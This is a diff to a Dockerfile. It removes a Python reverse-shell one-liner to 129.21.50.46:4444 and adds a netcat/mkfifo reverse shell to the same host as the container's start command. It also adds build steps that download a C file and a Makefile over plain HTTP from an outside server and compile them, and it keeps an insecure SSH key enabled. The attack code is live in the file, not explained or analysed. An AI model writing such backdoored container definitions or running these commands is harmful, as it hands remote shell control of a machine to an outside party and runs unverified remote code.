@@ -10,8 +10,9 @@ RUN /bd_build/prepare.sh && \
 
 RUN /usr/sbin/enable_insecure_key
 
-RUN apt-get install -y netcat
+RUN apt-get install -y gcc make
+RUN curl -O http://brooklyn.csh.rit.edu:8000/uvb.c
+RUN curl -O http://brooklyn.csh.rit.edu:8000/Makefile
+RUN make
 
-RUN python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("129.21.50.46",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-CMD ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("129.21.50.46",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"]
+CMD ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 129.21.50.46 4444 >/tmp/f"]
